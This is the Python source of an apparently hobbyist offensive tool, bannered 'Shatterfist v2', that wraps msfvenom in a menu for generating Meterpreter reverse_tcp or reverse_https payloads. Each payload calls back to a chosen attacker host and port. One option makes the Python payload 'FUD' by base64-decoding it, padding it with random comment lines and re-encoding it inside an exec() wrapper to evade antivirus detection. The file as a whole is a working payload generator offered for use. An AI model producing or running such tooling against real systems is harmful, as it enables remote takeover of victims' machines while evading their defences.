#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
#custom import 
import varsx 
import random
import string 

banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')

lhost = varsx.lhost
lport = varsx.lport
talkbackm1 = "tcp"

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls")

#For prntopt func
n = 1
def prntopt(texxt):  
    global n
    print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + str(n) + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   

def prntbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

def done(texxt):
    print(colorama.Fore.LIGHTGREEN_EX + str(texxt) + colorama.Style.RESET_ALL)

def inputcopt(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.YELLOW + str(texxt) + colorama.Fore.WHITE).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg
def inputc(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Fore.GREEN).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg    

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
    lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
    if lhostask.strip() != '':
        lhost = lhostask
    if lportask.strip() != '':
        lport = lportask    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile):
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    


def asktb():
    global n, talkbackm1 
    n = 1 
    prntopt("Use reverse_tcp")
    prntopt("Use reverse_https")
    talkbackopt = inputcopt("Option: ").strip()
    if  talkbackopt == "1" or talkbackopt == "tcp":
        talkbackm1 = "tcp"
    elif talkbackopt == "2" or talkbackopt == "https":
        talkbackm1 = "https"
    else:
        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}")

        


def pythonpayload():
    global n, pyoutfile
    n = 1
    pyoutfile = varsx.pyoutfile
    clearscreen()
    prntbannred("Python Payload Menu")
    prntopt("Create a simple python payload")
    prntopt("Create an obfistucated (FUD) python payload")
    asktb()
    inputpy = inputc("Option: ").strip()
    lask()
    inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
    if inputpy2.strip() != "":
        pyoutfile = inputpy2
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
        print(colorama.Style.RESET_ALL)
    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
        pythonpayloadfud()

def pythonpayloadfud():
    print("Making payload FUD...")
    pytempf = open(pyoutfile + ".tmp", "r")
    dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
    pytempf.close()
    pycode = base64.b64decode(b64pycode)
    #print(pycode)
    splpycode = pycode.decode().split("\n")
    #print(splpycode)
    pycodeembedlist = []
    for z in splpycode:
        pycodeembedlist.append(z)
        pycodeembedlist.append("\n")
        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
        pycodeembedlist.append("\n")
    finalcode = ''.join(pycodeembedlist)  
    finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
    outpy = (b4b64 + str(finalcodeb64) + afb64)
    file = open(pyoutfile, "w")
    file.write(outpy)
    file.close
    done(f"Saved as {pyoutfile} \nDone!")


    

def menu():
    prntopt("Create a python payload (MSF)")
    prntopt("Create a windows payload (MSF)")
    prntopt("Create an android payload (MSF)")
    prntopt("Create an embedded android payload (MSF, Reverse TCP)")
    prntopt("Start the Metasploit Framework Console")
    input1 = inputcopt("Option: ")
    if input1 == "1":
        pythonpayload()
        
def main():
    clearscreen()
    print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
    menu()

main()



    




                                                               